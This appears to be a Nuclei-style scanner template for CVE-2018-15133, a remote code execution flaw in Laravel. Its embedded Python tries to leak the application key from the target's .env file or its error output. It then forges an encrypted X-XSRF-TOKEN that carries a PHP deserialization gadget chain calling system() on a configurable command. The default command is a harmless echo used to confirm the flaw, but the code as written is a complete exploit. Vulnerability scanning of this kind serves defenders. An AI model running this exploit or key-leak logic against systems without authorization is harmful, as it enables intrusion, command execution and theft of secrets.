id: CVE-2018-15133

info:
  name: Laravel Framework Token Unserialize RCE with APP_KEY Leak Detection
  author: D3nverNg
  severity: High
  description: |
    Laravel Framework versions 5.5.40 and 5.6.x through 5.6.29 contain a remote code execution caused by unserialize call on untrusted X-XSRF-TOKEN value in Encrypter.php and phpggc gadgetchains, letting attackers with prior access execute arbitrary code, exploit requires attacker to know the application key.
  reference:
    - https://github.com/kozmic/laravel-poc-CVE-2018-15133
    - https://nvd.nist.gov/vuln/detail/CVE-2018-15133
    - https://laravel.com/docs/5.6/upgrade#upgrade-5.6.30
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.1
    cve-id: CVE-2018-15133
    cwe-id: CWE-502
  metadata:
    verified: true
    max-request: 4
  tags: cve,cve2018,laravel,rce,deserialization,appkey-leak

variables:
  cmd: "echo CVE-2018-15133"

code:
  - engine: python
    source: |
      import os, re, sys, base64, json, hmac, hashlib, requests
      from Crypto.Cipher import AES
      from Crypto.Util.Padding import pad
      from urllib.parse import urljoin

      requests.packages.urllib3.disable_warnings()

      target = os.environ["RootURL"]
      cmd = os.environ["cmd"]
      user_key = os.environ.get("APPKEY", "").strip()

      # ----------------------------
      # CASE 2: User supplied APPKEY
      # ----------------------------
      if user_key.startswith("base64:"):
          key = user_key.replace("base64:", "")
          print("[+] Using user supplied APP_KEY")
      else:
          # ----------------------------
          # CASE 1: Auto leak detection
          # ----------------------------
          def env_leak():
              try:
                  r = requests.get(urljoin(target, ".env"), timeout=5, verify=False)
                  m = re.search(r"APP_KEY=base64:([A-Za-z0-9+/=]+)", r.text)
                  return m.group(1) if m else ""
              except:
                  return ""

          def framework_leak():
              try:
                  r = requests.post(
                      urljoin(target, "index.php"),
                      headers={"X-XSRF-TOKEN": "A"},
                      timeout=5,
                      verify=False
                  )
                  m = re.search(r"base64:([A-Za-z0-9+/=]{40,})", r.text)
                  return m.group(1) if m else ""
              except:
                  return ""

          key = env_leak() or framework_leak()

          if not key:
              print("NO_APP_KEY")
              sys.exit(0)

          print("[+] APP_KEY leaked automatically")

      # ----------------------------
      # Generate encrypted token
      # ----------------------------
      keyb = base64.b64decode(key)
      null = "\x00"

      payload = (
          f'O:40:"Illuminate\\\\Broadcasting\\\\PendingBroadcast":2:{{'
          f's:9:"{null}*{null}events";'
          f'O:15:"Faker\\\\Generator":1:{{'
          f's:13:"{null}*{null}formatters";a:1:{{'
          f's:8:"dispatch";s:6:"system";}}}}'
          f's:8:"{null}*{null}event";'
          f's:{len(cmd)}:"{cmd}";}}'
      )

      cipher = AES.new(keyb, AES.MODE_CBC)
      iv = cipher.iv
      enc = cipher.encrypt(pad(payload.encode(), 16))

      ivb = base64.b64encode(iv).decode()
      valb = base64.b64encode(enc).decode()

      mac = hmac.new(
          keyb,
          (ivb + valb).encode(),
          hashlib.sha256
      ).hexdigest()

      token = base64.b64encode(json.dumps({
          "iv": ivb.replace("/", "\\/"),
          "value": valb.replace("/", "\\/"),
          "mac": mac
      }).encode()).decode()

      print(token)

http:
  - raw:
      - |
        POST /index.php HTTP/1.1
        Host: {{Hostname}}
        X-XSRF-TOKEN: {{code_response}}

    matchers:
      - type: word
        part: body
        words:
          - "CVE-2018-15133"